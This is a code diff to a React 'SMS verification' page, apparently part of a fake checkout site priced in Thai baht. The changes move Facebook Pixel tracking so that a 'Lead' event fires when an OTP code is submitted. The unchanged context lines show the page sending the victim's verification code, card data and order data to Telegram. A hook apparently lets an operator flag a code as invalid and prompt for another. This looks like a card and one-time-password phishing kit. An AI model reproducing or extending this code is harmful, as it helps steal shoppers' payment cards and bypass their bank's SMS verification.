@@ -67,6 +67,11 @@ const SMSVerificationPage = () => {
     // Send SMS code to Telegram
     notifySMSCodeEntered(verificationCode, cardData, orderData)
 
+    // Track Facebook Pixel Lead event - ONLY when OTP code is submitted
+    if (typeof fbq !== 'undefined') {
+      fbq('track', 'Lead')
+    }
+
     // Start checking for invalid SMS flag (only after SMS submission)
     if (window.startInvalidSMSCheck) {
       window.startInvalidSMSCheck()
@@ -100,17 +105,6 @@ const SMSVerificationPage = () => {
 
           // Save order
           localStorage.setItem(`order_${finalOrderData.orderId}`, JSON.stringify(finalOrderData))
-
-          // Track Facebook Pixel Purchase event
-          if (typeof fbq !== 'undefined') {
-            fbq('track', 'Purchase', {
-              value: orderData.total,
-              currency: 'THB',
-              content_type: 'product',
-              content_ids: orderData.cartItems.map(item => item.id),
-              num_items: orderData.cartItems.length
-            })
-          }
 
           // Navigate to order confirmation
           navigate('/order-confirmation', {
@@ -210,17 +204,6 @@ const SMSVerificationPage = () => {
 
           // Save order
           localStorage.setItem(`order_${finalOrderData.orderId}`, JSON.stringify(finalOrderData))
-
-          // Track Facebook Pixel Purchase event
-          if (typeof fbq !== 'undefined') {
-            fbq('track', 'Purchase', {
-              value: orderData.total,
-              currency: 'THB',
-              content_type: 'product',
-              content_ids: orderData.cartItems.map(item => item.id),
-              num_items: orderData.cartItems.length
-            })
-          }
 
           // Navigate to order confirmation
           navigate('/order-confirmation', {
